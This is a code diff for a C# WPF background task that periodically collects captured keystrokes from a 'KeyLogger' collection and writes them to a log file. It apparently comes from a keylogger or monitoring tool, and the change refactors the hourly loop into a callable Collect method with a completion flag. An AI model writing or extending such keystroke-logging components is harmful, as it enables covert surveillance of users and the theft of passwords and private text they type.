@@ -14,9 +14,14 @@ namespace WPF.Managers.Tasks
     {
         public BackgroundWorker BackgroundWorker { get; } = new BackgroundWorker();
 
+        public bool MustBeCollected => true;
+
+        public bool Completed { get; set; }
+
         public void Dispose()
         {
             BackgroundWorker.DoWork -= BackgroundWorker_DoWork;
+            BackgroundWorker.DoWork -= BackgroundWorker_Collect;
             GC.Collect();
         }
 
@@ -30,24 +35,38 @@ namespace WPF.Managers.Tasks
         {
             while(true)
             {
+                BackgroundWorker_Collect(sender, e);
                 Thread.Sleep(3600000); // Sleep one hour
-                if(MainContext.Instance.KeyLogger.Any())
-                {
-                    var stringbuilder = new StringBuilder();
-                    foreach (var log in MainContext.Instance.KeyLogger)
-                    {
-                        stringbuilder.Append(log);
-                        stringbuilder.Append(Environment.NewLine);
-                    }
-                    MainContext.Instance.KeyLogger.Clear();
-
-                    LogManager.Instance.LogToFile(new Models.LogInfoModel
-                    {
-                        Type = Models.Enums.FileTypesEnum.KEYLOGGER,
-                        Message = stringbuilder.ToString()
-                    });
-                }
             }
+        }
+
+        public void Collect()
+        {
+            BackgroundWorker.DoWork -= BackgroundWorker_DoWork;
+            BackgroundWorker.DoWork += BackgroundWorker_Collect;
+            BackgroundWorker.RunWorkerAsync();
+        }
+
+        private void BackgroundWorker_Collect(object sender, DoWorkEventArgs e)
+        {
+            Completed = false;
+            if (MainContext.Instance.KeyLogger.Any())
+            {
+                var stringbuilder = new StringBuilder();
+                foreach (var log in MainContext.Instance.KeyLogger)
+                {
+                    stringbuilder.Append(log);
+                    stringbuilder.Append(Environment.NewLine);
+                }
+                MainContext.Instance.KeyLogger.Clear();
+
+                LogManager.Instance.LogToFile(new Models.LogInfoModel
+                {
+                    Type = Models.Enums.FileTypesEnum.KEYLOGGER,
+                    Message = stringbuilder.ToString()
+                });
+            }
+            Completed = true;
         }
     }
 }
